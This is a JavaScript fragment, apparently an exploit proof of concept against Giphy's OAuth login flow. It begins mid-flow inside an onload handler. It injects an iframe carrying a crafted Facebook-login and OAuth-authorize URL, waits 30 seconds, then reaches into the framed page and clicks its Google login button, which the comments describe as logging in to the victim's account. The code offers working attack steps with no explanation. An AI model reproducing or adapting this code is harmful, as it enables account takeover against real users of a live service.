document.getElementById('pi').onload = function() {

//second iframe to login to victims google account
 var profileIframe1 = document.createElement('iframe');
 profileIframe1.setAttribute('src', 'https://giphy.com/login/facebook/?next=/oauth/authorize/%3Fresponse_type%3Dcode%26client_id%3DC7yftGDVCAhmaTnJCKv3eNaRsANYTDDf7PA9jZbw%26redirect_uri%3Dhttps%253A%252F%252Fdevportal-new.giphy.com%252Foauth%252Fexchange%252F');
 profileIframe1.setAttribute('id', 'lo1');
 document.body.appendChild(profileIframe1);

//waiting for 30 seconds for the iframe to load properly
document.getElementById('lo1').onload = function() {
setTimeout(function(){ load() }, 30000)

function load()
{
let iframe = document.getElementById('lo1');
let inner = iframe.contentDocument || iframe.contentWindow.document;

//Clicked google login in iframe to login to victim
inner.getElementsByClassName("g_login")[1].click();

}
}
}
